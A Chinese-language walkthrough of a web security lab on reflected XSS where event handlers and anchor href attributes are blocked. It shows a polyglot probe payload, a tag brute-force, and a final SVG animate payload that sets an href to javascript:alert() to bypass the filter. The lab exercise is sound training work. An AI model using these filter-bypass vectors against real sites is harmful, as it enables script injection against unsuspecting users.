# 实验：事件处理程序和 `href` 属性被阻止的反射型 XSS

本实验包含一个反射型 XSS 漏洞，其中部分标签在白名单中，但所有事件处理程序和锚点 `href` 属性均被阻止。

为了解决本实验，请执行一个跨站脚本攻击，注入一个向量，当该向量被点击时，会调用 `alert` 函数。

请注意，你需要用单词 "Click" 来标记你的向量，以便诱导模拟的实验室用户点击你的向量。例如：

```html
<a href="">Click me</a>
```

## 步骤

探测
- 在搜索功能中使用多上下文载荷
    `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`

    ```http
    GET /?search=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> HTTP/2
    ```

    - 响应，事件被阻止
        ```http
        HTTP/2 400 Bad Request

        "Event is not allowed"
        ```

- 使用 portswigger 的 XSS 速查表中的标签进行爆破
    ```http
    GET /?search=<爆破位置> HTTP/2
    ```

    -  可用列表

        ```
        a
        animate
        image
        svg
        title
        ```

        - 预期为 svg 的 animate 控制 a 的标签

攻击
- 使用速查表示例载荷
    `<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>`

    - 响应，属性被阻止
        - 其中用来定位目标修改元素的属性 `xlink:href` 被阻止
    
    - 查阅 [MDN 文档](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Attribute/xlink:href#animate_animatemotion_animatetransform_set)
        > 如果未提供 xlink:href 属性，则目标元素将是当前动画元素的直接父元素。
        - 此处 animate 与 a 并列后使用 `xlink:href` 指定目标元素
        - 设置 a 为 animate 的父元素即可默认指定父元素而省略此属性

- 修改为 a 作为 animate 的父元素
    `<svg><a><animate attributeName=href values=javascript:alert() /><text x=20 y=20>Click me</text></a>`
    
    - `attributeName` 修改的属性名
    - `values` 修改的属性值
    - `animate` 未指定 `xlink:href` 于是默认修改父元素
